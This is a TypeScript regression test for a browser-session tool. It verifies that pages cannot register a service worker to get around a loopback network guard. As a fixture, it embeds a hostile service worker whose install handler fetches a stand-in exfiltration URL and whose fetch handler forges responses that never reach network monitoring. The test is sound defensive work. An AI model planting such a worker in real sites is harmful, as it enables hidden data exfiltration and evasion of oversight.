import { after, before, test } from "node:test";
import assert from "node:assert/strict";
import { createServer, type Server } from "node:http";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { BrowserSession } from "../src/browser-session.js";

/**
 * Hostile service worker used by the regression test. If it ever ran, its
 * install handler would fetch an external URL, and its fetch handler would
 * answer every request from a constructed Response — a Response that never
 * reaches the network stack, so context.route (the loopback guard) could
 * neither block it nor record evidence of it.
 */
const HOSTILE_SW = `self.addEventListener("install", () => {
  fetch("https://example.com/sw-exfil").catch(() => {});
});
self.addEventListener("fetch", (event) => {
  event.respondWith(new Response("served-by-sw", { status: 200 }));
});`;

/**
 * Page that attempts to register a service worker and reports the outcome.
 * Served from http://localhost (a secure context) so that
 * navigator.serviceWorker is available and the only reason registration
 * fails is the context-level block.
 */
const SW_ATTEMPT_PAGE = `<!doctype html>
<html>
  <head><title>SW attempt</title></head>
  <body>
    <h1>SW attempt</h1>
    <div id="result">pending</div>
    <script>
      (async () => {
        const record = { secure: typeof navigator.serviceWorker !== "undefined" };
        if (record.secure) {
          try {
            const reg = await navigator.serviceWorker.register("/sw.js");
            record.regResult = reg === undefined ? "undefined" : "registration-object";
          } catch (error) {
            record.regResult = "error:" + error.name;
          }
          try {
            const registrations = await navigator.serviceWorker.getRegistrations();
            record.regCount = registrations.length;
          } catch (error) {
            record.regCount = "error:" + error.name;
          }
          record.hasController = navigator.serviceWorker.controller !== null;
        }
        const text = "SW-GUARD-RESULT " + JSON.stringify(record);
        document.getElementById("result").textContent = text;
        console.log(text);
      })();
    </script>
  </body>
</html>`;

let server: Server;
let baseUrl = "";
let outputDir = "";

before(async () => {
  outputDir = await mkdtemp(join(tmpdir(), "wims-browser-sw-test-"));
  server = createServer((req, res) => {
    if (req.url === "/sw.js") {
      res.setHeader("Content-Type", "text/javascript");
      res.end(HOSTILE_SW);
      return;
    }
    res.setHeader("Content-Type", "text/html");
    res.end(SW_ATTEMPT_PAGE);
  });
  await new Promise<void>((resolve) => {
    server.listen(0, "127.0.0.1", () => resolve());
  });
  const address = server.address();
  if (!address || typeof address === "string") throw new Error("Failed to start test server");
  // Navigate via "localhost" so the page is a secure context: the service
  // worker API is available and any registration failure is caused by the
  // guard, not by the origin not being a secure context.
  baseUrl = `http://localhost:${address.port}`;
});

after(async () => {
  await new Promise<void>((resolve, reject) => {
    server.close((error) => (error ? reject(error) : resolve()));
  });
  await rm(outputDir, { recursive: true, force: true });
});

function makeSession(): BrowserSession {
  return new BrowserSession({
    cwd: outputDir,
    outputDir,
    viewport: { width: 1200, height: 800 },
    retention: { maxArtifacts: 50, maxBytes: 512 * 1024 * 1024, maxAgeDays: 7 },
    actionTimeoutMs: 10_000,
    navigationTimeoutMs: 10_000,
  });
}

test("service workers are blocked: a local page cannot register/use one to bypass the loopback guard", async () => {
  const session = makeSession();
  await session.start();
  try {
    await session.navigate(`${baseUrl}/sw-attempt`);
    // Deterministic sync: wait until the page ran its registration attempt
    // and recorded the outcome into the DOM and console.
    await session.waitFor({ text: "SW-GUARD-RESULT" });

    // 1) Registration is blocked/unavailable even though the page is a
    // secure context (navigator.serviceWorker exists): register() yields no
    // registration, there are zero registrations, and no worker controls
    // the page — so no worker script ever runs.
    const consoleText = (await session.consoleMessages("info", true)).text;
    assert.match(consoleText, /SW-GUARD-RESULT/, "page must report its service worker attempt");
    assert.match(consoleText, /"secure":true/, "localhost must be a secure context; the block below is the guard, not a missing API");
    assert.match(consoleText, /"regResult":"undefined"/, "register() must not produce a registration");
    assert.match(consoleText, /"regCount":0/, "no service worker registration may exist");
    assert.match(consoleText, /"hasController":false/, "no service worker may control the page");
    assert.match(
      consoleText,
      /Service Worker registration blocked by Playwright/,
      "the context must block registration at the Playwright level",
    );

    // 2) External request evidence cannot escape: the only request that
    // happened is the local document itself. The service worker script was
    // never fetched (registration is stopped before any worker code loads)
    // and no external URL appears anywhere in the evidence.
    const networkText = (await session.networkRequests()).text;
    assert.match(networkText, /GET 200 document http:\/\/localhost:\d+\/sw-attempt/, "the local page load must be recorded");
    assert.doesNotMatch(networkText, /sw\.js/, "the service worker script must never be fetched");
    assert.doesNotMatch(networkText, /example\.com/, "no external request evidence may escape");
    assert.doesNotMatch(networkText, /BLOCKED/, "no external request was even attempted, so nothing can bypass the guard");
  } finally {
    await session.stop();
  }
});
